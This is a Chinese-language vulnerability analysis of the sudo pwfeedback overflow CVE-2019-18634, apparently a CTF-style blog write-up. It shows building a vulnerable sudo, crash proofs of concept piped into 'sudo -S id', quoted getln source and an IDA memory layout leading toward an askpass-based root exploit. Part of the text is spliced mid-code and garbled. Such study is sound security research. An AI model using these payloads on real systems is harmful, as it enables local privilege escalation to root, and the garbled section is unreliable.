## 漏洞概述
CVE-2019-18634是一个`sudo
提权漏洞`。影响sudo版本为`[1.7.1,1.8.31)`。在官方描述中只提及该漏洞可以在`1.8.26`前的版本中利用，实际上在1.8.26的版本中仍有利用的方式。具体地，如果`pwfeedback`配置选项在`/etc/sudoers`被启用，攻击者可以利用一个栈溢出漏洞(`实际上溢出点在bss段`)来获取root权限。这个配置选项在多数的Linux系统中都不是默认选项，但是在`Linux
Mint`操作系统和`Elementary OS`上是默认开启的，因此漏洞的危害比较大，攻击者需要向`getln`传递一个超长字符串来触发攻击。
## 漏洞复现
下载`sudo-1.8.25`源码并编译
    wget https://www.sudo.ws/dist/sudo-1.8.25.tar.gz
    tar -zxvf ./sudo-1.8.25.tar.gz
    cd ./sudo-1.8.25
    ./configure
    make -j4
    make install
系统默认的`sudo`位于`/usr/bin/`目录下,编译之后的sudo会放在`/usr/local/bin/`目录下，在环境变量中后者更靠前因此默认调用的是我们编译之后的binary。
    ╭─wz@wz-virtual-machine ~/Desktop/CTF/CVE-2019-18634/my_exp ‹hexo*› 
    ╰─$ which sudo                                                1 ↵
    /usr/local/bin/sudo
    ╭─wz@wz-virtual-machine ~/Desktop/CTF/CVE-2019-18634/my_exp ‹hexo*› 
    ╰─$ ll /usr/bin/sudo
    -rwsr-xr-x 1 root root 134K 2月   1 02:37 /usr/bin/sudo
    ╭─wz@wz-virtual-machine ~/Desktop/CTF/CVE-2019-18634/my_exp ‹hexo*› 
    ╰─$ ll /usr/local/bin/sudo
    ╭─wz@wz-virtual-machine ~/Desktop/CTF/CVE-2019-18634/my_exp ‹hexo*› 
    ╰─$ sudo --version
    Sudo version 1.8.25
    Sudoers policy plugin version 1.8.25
    Sudoers file grammar version 46
    Sudoers I/O plugin version 1.8.25
漏洞的复现环境为`Ubuntu
16.04`，默认没有开启`pwfeedback`配置，因此我们首先切换到root用户，修改`/etc/sudoers`，添加一行`Defaults
pwfeedback`，然后使用`sudo -l`列出用户的可用权限，可以看到配置生效。
    ╭─wz@wz-virtual-machine ~/Desktop/CTF/CVE-2019-18634/my_exp ‹hexo*› 
    ╰─$ sudo -l
    Matching Defaults entries for wz on wz-virtual-machine:
        pwfeedback, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    User wz may run the following commands on wz-virtual-machine:
        (ALL : ALL) ALL
首先拿POC进行测试，第一个POC为多个`A*100+‘\x00’`组成的字符串，`-S`参数指的是从stdin读取密码，成功使得sudo崩溃。这个poc适用于1.8.26以前的漏洞版本。
    ─wz@wz-virtual-machine ~/Desktop/CTF/CVE-2019-18634/my_exp ‹hexo*› 
    ╰─$ perl -e 'print(("A" x 100 . "\x{00}") x 50)' | sudo -S id                                                                  132 ↵
    Password: 
    [1]    31047 done                                        perl -e 'print(("A" x 100 . "\x{00}") x 50)' | 
           31048 illegal hardware instruction (core dumped)  sudo -S id
第二个POC的payload与第一个相似，只是末尾结束符从`\x00`改成了`\x15`。通过`socat`创建一个`伪终端pty`。`waitslave`参数使得当`sudo`从`/tmp/pty`读取输入时，执行下述的命令向文件中输入payload。可以看到这个POC也成功使得sudo崩溃。
    ╭─wz@wz-virtual-machine ~/Desktop/CTF/CVE-2019-18634/my_exp ‹hexo*› 
    ╰─$ socat pty,link=/tmp/pty,waitslave exec:"perl -e 'print((\"A\" x 100 . chr(0x15)) x 50)'" &
    [1] 30757
    ╭─wz@wz-virtual-machine ~/Desktop/CTF/CVE-2019-18634/my_exp ‹hexo*› 
    ╰─$ sudo -S id  buf) {
                if (write(fd, "\b \b", 3) == -1)//vul
                break;
                --cp;
            }
            left = bufsiz;//重新赋值
            continue;
            } else if (c == sudo_term_erase) {
            if (cp > buf) {
                if (write(fd, "\b \b", 3) == -1)
                break;
                --cp;
                left++;
            }
            continue;
            }
            ignore_result(write(fd, "*", 1));
        }
        *cp++ = c;//赋值部分
        }
        *cp = '\0';
        if (feedback) {
        /* erase stars */
        while (cp > buf) {
            if (write(fd, "\b \b", 3) == -1)
            break;
            --cp;
        }
        }
        debug_return_str_masked(nr == 1 ? buf : NULL);
    }
## 漏洞利用
### 漏洞定位 && 前置知识
首先定位一下输入的位置，在IDA中打开`sudo`，查看getlen的调用定位到目标调用处，可以看到内存排布为`buf[0x100]->askpass[0x20]->signo[0x104]->tgetpass_flags[0x1c]->user_details[0x68]`。
    sudo_debug_ret = getln(v18, buf_6188, flagsa & 8, v19);
    /*
    bss:00000000002218E0 buf_6188        db 100h dup(?)          ; DATA XREF: tgetpass+412↑o
    .bss:00000000002219E0 ; Function-local static variable
    .bss:00000000002219E0 ; const char *askpass_6187
    .bss:00000000002219E0 askpass_6187    dq ?                    ; DATA XREF: tgetpass+5D↑r
    .bss:00000000002219E0                                         ; tgetpass+81↑r ...
    .bss:00000000002219E8                 align 20h
    .bss:0000000000221A00 ; volatile sig_atomic_t signo[65]
    .bss:0000000000221A00 signo           dd 41h dup(?)           ; DATA XREF: tgetpass_handler+5↑o
    .bss:0000000000221A00                                         ; tgetpass+1EA↑o
    .bss:0000000000221B04                 public tgetpass_flags
    .bss:0000000000221B04 ; int tgetpass_flags
    .bss:0000000000221B04 tgetpass_flags  dd ?                    ; DATA XREF: sudo_conversation+5F↑r
    .bss:0000000000221B04                                         ; parse_args:loc_11D90↑w ...
    .bss:0000000000221B08                 align 20h
    .bss:0000000000221B20                 public user_details_0
    .bss:0000000000221B20 ; user_details user_details_0
    .bss:0000000000221B20 user_details_0  user_details         ; DATA XREF: get_user_info+41↑o
    .bss:0000000000221B20                                         ; get_user_info+77↑w ...
    .bss:0000000000221B88                 public list_user
    .bss:0000000000221B88 ; const char *list_user
    .bss:0000000000221B88 list_user       dq ?                    ; DATA XREF: main+87F↑r
    */
    //tgetpass.c
    static const char *askpass;
    static char buf[SUDO_CONV_REPL_MAX + 1];
`askpass`变量定义在`tgetpass.c`，为静态变量，这个变量对于漏洞利用来说很关键，其作用是指定一个可执行程序，从这个程序中获取输入作为密码。检查`TGP_ASKPASS`这个flag之后选择启用该选项。从环境变量`SUDO_ASKPASS`中读取要执行的程序，调用`sudo_askpass`函数，其中`fork`出子进程来执行程序，在这之前会检查`suid/uid/gid`详情可以查看下列函数调用中的注释。之后调用`getln`获取输入，注意这里没有启用`pwfeedback`。
    /*